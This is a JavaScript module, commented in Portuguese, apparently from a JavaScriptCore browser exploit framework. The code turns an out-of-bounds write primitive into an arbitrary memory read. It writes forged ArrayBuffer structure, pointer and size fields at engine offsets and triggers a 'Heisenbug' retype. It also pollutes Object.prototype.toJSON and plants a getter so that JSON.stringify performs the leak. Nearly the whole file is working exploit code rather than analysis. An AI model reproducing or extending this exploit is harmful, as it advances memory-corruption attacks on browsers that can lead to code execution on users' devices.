// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
console.log("[CONSOLE_LOG][RETYPE_SCRIPT] Módulo testRetypeOOB_AB_ViaShadowCraft.mjs carregado.");
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, // Adicionado para completude se necessário dentro deste módulo
    clearOOBEnvironment // Adicionado para completude se necessário
} from '../core_exploit.mjs'; // Corrigido para ../core_exploit.mjs
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Corrigido para ../config.mjs

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let currentReadTarget = null;
let retype_leak_attempt_results = { success: false, value_read: null, error: null, getter_called: false };

class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    retype_leak_attempt_results.getter_called_intermediate_json = true; // Flag para saber que o toJSON foi chamado
    // logS3(`toJSON_TriggerRetypeCheckpointGetter: this.id = ${this?.id}`, "info", FNAME_toJSON);
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) { // Iterar sobre as próprias propriedades e as do protótipo
            if (prop === GETTER_CHECKPOINT_PROPERTY_NAME) {
                // logS3(`toJSON: Acessando propriedade getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
                const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
                returned_payload[prop] = `Getter Invoked, returned: ${String(val)}`;
                break; // Uma vez que o getter principal é acionado, podemos sair.
            }
        }
    } catch (e) {
        logS3(`toJSON: Erro ao processar this: ${e.message}`, "error", FNAME_toJSON);
        returned_payload.error_in_toJSON = e.message;
        if (retype_leak_attempt_results) retype_leak_attempt_results.error_in_json = e.message;
    }
    return returned_payload;
}

function RetypeCheckpointGetter() {
    const FNAME_Getter = "RetypeCheckpointGetter";
    logS3(`!!! ${FNAME_Getter} ACIONADO !!! Tentando ler de: ${currentReadTarget.address.toString(true)} (tamanho: ${currentReadTarget.size})`, "good", FNAME_Getter);
    if (retype_leak_attempt_results) retype_leak_attempt_results.getter_called = true;

    try {
        if (!oob_array_buffer_real) throw new Error("oob_array_buffer_real não está inicializado no getter.");
        if (!currentReadTarget) throw new Error("currentReadTarget não definido no getter.");

        const dv = new DataView(oob_array_buffer_real);

        if (dv.byteLength !== currentReadTarget.size) {
            logS3(`AVISO no Getter: dv.byteLength (${dv.byteLength}) !== tamanho esperado (${currentReadTarget.size}). Re-tipagem pode ter falhado ou sido parcial.`, "warn", FNAME_Getter);
        } else {
            logS3(`SUCESSO no Getter: dv.byteLength (${dv.byteLength}) corresponde ao tamanho esperado.`, "good", FNAME_Getter);
        }

        // Tenta ler os dados, mesmo que o tamanho seja diferente (o data_ptr pode estar correto)
        let valueRead = null;
        if (currentReadTarget.size === 1) valueRead = dv.getUint8(0);
        else if (currentReadTarget.size === 2) valueRead = dv.getUint16(0, true);
        else if (currentReadTarget.size === 4) valueRead = dv.getUint32(0, true);
        else if (currentReadTarget.size === 8) {
            const low = dv.getUint32(0, true);
            const high = dv.getUint32(4, true);
            valueRead = new AdvancedInt64(low, high);
        } else if (currentReadTarget.size > 0) {
            const buffer = new Uint8Array(Math.min(dv.byteLength, currentReadTarget.size)); // Lê até o menor dos tamanhos
            for(let i=0; i < buffer.byteLength; i++) {
                buffer[i] = dv.getUint8(i);
            }
            valueRead = buffer;
        } else {
            throw new Error(`Tamanho de leitura inválido ou zero: ${currentReadTarget.size}`);
        }

        if (retype_leak_attempt_results) {
            retype_leak_attempt_results.value_read = valueRead;
            retype_leak_attempt_results.success = true;
        }
        logS3(`Getter: Leitura especulativa bem-sucedida. Valor: ${isAdvancedInt64Object(valueRead) ? valueRead.toString(true) : toHex(valueRead)}`, "leak", FNAME_Getter);

    } catch (e) {
        logS3(`Getter: ERRO CRÍTICO durante a tentativa de leitura: ${e.message}`, "critical", FNAME_Getter);
        console.error(`[CONSOLE_LOG][${FNAME_Getter}] Erro:`, e);
        if (retype_leak_attempt_results) {
            retype_leak_attempt_results.error = e.message;
            retype_leak_attempt_results.success = false;
        }
    }
    return "GetterForRetypeCheck_Processed";
}

async function triggerRetypeMechanismWithHeisenbug() {
    const FNAME_Trigger = "triggerRetypeMechanismWithHeisenbug";
    logS3("Acionando mecanismo de re-tipagem (Heisenbug)...", "info", FNAME_Trigger);
    if (OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET === undefined || OOB_CONFIG.HEISENBUG_TRIGGER_VALUE === undefined) {
        logS3("ERRO: Configuração do Heisenbug (offset ou valor) não definida!", "critical", FNAME_Trigger);
        throw new Error("Heisenbug trigger config missing.");
    }
    logS3(`Escrevendo ${toHex(OOB_CONFIG.HEISENBUG_TRIGGER_VALUE)} em offset absoluto 0x${OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET.toString(16)} (Heisenbug Trigger).`, "info", FNAME_Trigger);
    oob_write_absolute(OOB_CONFIG.HEISENBUG_TRIGGER_OFFSET, OOB_CONFIG.HEISENBUG_TRIGGER_VALUE, 4);
    await PAUSE_S3(SHORT_PAUSE_S3 / 2); // Pausa muito curta
}

export async function read_arbitrary_via_retype(addressToRead, sizeToRead) {
    const FNAME_READ_ARB = "read_arbitrary_via_retype";
    logS3(`Tentando leitura arbitrária de ${addressToRead.toString(true)} (tamanho: ${sizeToRead})`, "test", FNAME_READ_ARB);
    console.log(`[CONSOLE_LOG][${FNAME_READ_ARB}] Endereço: ${addressToRead.toString(true)}, Tamanho: ${sizeToRead}`);

    // Resetar estado para esta tentativa de leitura
    currentReadTarget = { address: addressToRead, size: sizeToRead };
    retype_leak_attempt_results = { success: false, value_read: null, error: null, getter_called: false, getter_called_intermediate_json: false };

    let originalToJSONProtoDesc = null;
    let toJSONPollutionApplied = false;
    let originalGetterDesc = null;
    let getterPollutionApplied = false;
    const ppKey_val = "toJSON";

    try {
        await triggerOOB_primitive();

        const shadow_structure_id_val = JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || 2;
        const shadow_structure_id_offset = 0x0;
        const shadow_structure_ptr_val = new AdvancedInt64(0,0);
        const shadow_structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // Ex: 0x8
        const shadow_data_ptr_val = addressToRead;
        const shadow_data_ptr_config_offset = JSC_OFFSETS.ArrayBuffer?.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START || 0x20;
        const shadow_size_val = sizeToRead;
        const shadow_size_config_offset = JSC_OFFSETS.ArrayBuffer?.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18;

        // logS3(`  Escrevendo metadados sombra: StructureID=${shadow_structure_id_val} em 0x${shadow_structure_id_offset.toString(16)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_structure_id_offset, shadow_structure_id_val, 4);
        // logS3(`  Escrevendo metadados sombra: StructurePtr=${shadow_structure_ptr_val.toString(true)} em 0x${shadow_structure_ptr_offset.toString(16)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_structure_ptr_offset, shadow_structure_ptr_val, 8);
        // logS3(`  Escrevendo metadados sombra: DataPtr=${shadow_data_ptr_val.toString(true)} em 0x${shadow_data_ptr_config_offset.toString(16)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_data_ptr_config_offset, shadow_data_ptr_val, 8);
        // logS3(`  Escrevendo metadados sombra: Size=0x${shadow_size_val.toString(16)} em 0x${shadow_size_config_offset.toString(16)}`, "info", FNAME_READ_ARB);
        oob_write_absolute(shadow_size_config_offset, shadow_size_val, 4);

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerRetypeCheckpointGetter,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: RetypeCheckpointGetter,
            configurable: true, enumerable: false
        });
        getterPollutionApplied = true;

        await triggerRetypeMechanismWithHeisenbug();

        const checkpoint_obj = new CheckpointObjectForRetype(Date.now());
        // logS3("Chamando JSON.stringify(checkpoint_obj) para acionar o getter...", "info", FNAME_READ_ARB);
        const jsonResult = JSON.stringify(checkpoint_obj);
        // logS3(`JSON.stringify(checkpoint_obj) retornou: ${jsonResult.length > 100 ? jsonResult.substring(0,100) + "..." : jsonResult}`, "info", FNAME_READ_ARB);
        // await PAUSE_S3(SHORT_PAUSE_S3 / 2);

    } catch (e) {
        logS3(`ERRO em ${FNAME_READ_ARB}: ${e.message}`, "critical", FNAME_READ_ARB);
        console.error(`[CONSOLE_LOG][${FNAME_READ_ARB}] Erro:`,e);
        if(retype_leak_attempt_results) retype_leak_attempt_results.error = e.message;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { // Check if property exists before trying to delete/redefine
            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc);
            else delete CheckpointObjectForRetype.prototype[GETTER_CHECKPOINT_PROPERTY_NAME];
        }
        // Não limpar o ambiente OOB aqui (clearOOBEnvironment())
    }

    if (retype_leak_attempt_results.getter_called) {
        if (retype_leak_attempt_results.success) {
            logS3("SUCESSO ESPECULATIVO: Leitura arbitrária via re-tipagem parece ter funcionado!", "vuln", FNAME_READ_ARB);
        } else {
            logS3(`Getter foi chamado, mas a leitura arbitrária falhou. Erro no getter: ${retype_leak_attempt_results.error || "Nenhum"}`, "warn", FNAME_READ_ARB);
        }
    } else {
        const jsonCalled = retype_leak_attempt_results.getter_called_intermediate_json ? "Sim" : "Não";
        logS3(`Getter NÃO foi chamado. (toJSON foi chamado: ${jsonCalled}). A re-tipagem não pôde ser verificada/acionada. Erro durante setup: ${retype_leak_attempt_results.error || "Nenhum"}`, "error", FNAME_READ_ARB);
    }
    // logS3(`  Resultado da tentativa de leitura: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_READ_ARB);
    return retype_leak_attempt_results;
}
